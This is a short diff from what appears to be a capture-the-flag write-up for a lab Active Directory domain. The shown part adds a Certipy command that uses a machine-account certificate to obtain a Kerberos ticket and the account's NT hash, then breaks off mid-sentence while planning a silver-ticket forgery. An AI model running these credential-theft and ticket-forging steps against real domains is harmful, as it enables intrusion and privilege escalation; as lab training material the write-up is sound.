@@ -994,8 +994,22 @@ I now have the certificate for the `web-01$` user
 # Administrator on `web-01`
 
 ```python
+certipy-ad auth -pfx web-01.pfx -dc-ip 172.16.20.1                                               
+Certipy v5.1.0 - by Oliver Lyak (ly4k)
 
+[*] Certificate identities:
+[*]     SAN DNS Host Name: 'WEB-01.darkcorp.htb'
+[*]     Security Extension SID: 'S-1-5-21-3432610366-2163336488-3604236847-20601'
+[*] Using principal: 'web-01$@darkcorp.htb'
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to 'web-01.ccache'
+[*] Wrote credential cache to 'web-01.ccache'
+[*] Trying to retrieve NT hash for 'web-01$'
+[*] Got hash for 'web-01$@darkcorp.htb': aad3b435b51404eeaad3b435b51404ee:8f33c7fc7ff515c1f358e488fbb8b675
 ```
+
+Ill grab the NT hash, i can now use this to forge a silver ticket for the adminis
 
 
 
